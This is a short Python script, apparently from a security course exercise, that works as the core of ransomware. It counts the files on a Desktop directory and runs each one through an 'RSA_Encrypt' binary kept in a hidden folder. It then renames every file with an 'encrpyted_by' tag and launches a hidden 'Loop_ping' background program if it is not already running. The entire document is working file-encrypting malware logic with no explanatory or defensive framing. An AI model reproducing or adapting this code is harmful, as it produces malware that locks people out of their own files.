import os

DIR = "/home/attacker/Desktop"
command = ""
if os.path.exists("/home/attacker/Documents/.scarecrow/"):
    command = "/home/attacker/Documents/.scarecrow/RSA_Encrypt -C 126419 30743 "
else:
    command = "/home/attacker/Desktop/.Backup/RSA_Encrypt -C 126419 30743 "

print("the number of file is " + str(len([name for name in os.listdir(DIR) if os.path.isfile(os.path.join(DIR, name))])))

dirs = os.listdir(DIR)
for file in dirs:
    if os.path.isfile(os.path.join(DIR, file)):
        # print(file)
        file_path = os.path.join(DIR, file)
        # print(file_path)
        if "encrpyted_by0611234_0616037" not in file_path:
            run_cmd = command + file_path
            # print(run_cmd)
            os.system(run_cmd)
            os.rename(file_path, DIR + "/encrpyted_by0611234_0616037" + file)

        
proid = os.system('pgrep Loop_ping')
# print(proid)
if proid == 256:
    if os.path.exists("/home/attacker/Documents/.scarecrow/"):
	    os.system('/home/attacker/Documents/.scarecrow/Loop_ping')
    else:
	    os.system('/home/attacker/Desktop/.Backup/Loop_ping')
else:
    print("already Loop_ping")